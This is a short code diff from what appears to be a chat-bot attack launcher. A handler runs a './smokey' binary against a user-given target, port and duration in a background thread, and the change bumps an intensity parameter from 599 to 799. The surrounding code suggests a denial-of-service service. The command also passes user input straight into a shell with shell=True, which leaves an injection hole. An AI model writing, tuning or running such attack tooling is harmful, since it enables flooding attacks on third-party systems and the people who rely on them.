@@ -232,7 +232,7 @@ def handle_soul(message):
         # Start attack in background
         def run_attack():
             try:
-                subprocess.run(f"./smokey {target} {port} {duration} 599", 
+                subprocess.run(f"./smokey {target} {port} {duration} 799", 
                               shell=True, check=True)
             except Exception as e:
                 print(f"Attack error: {e}")
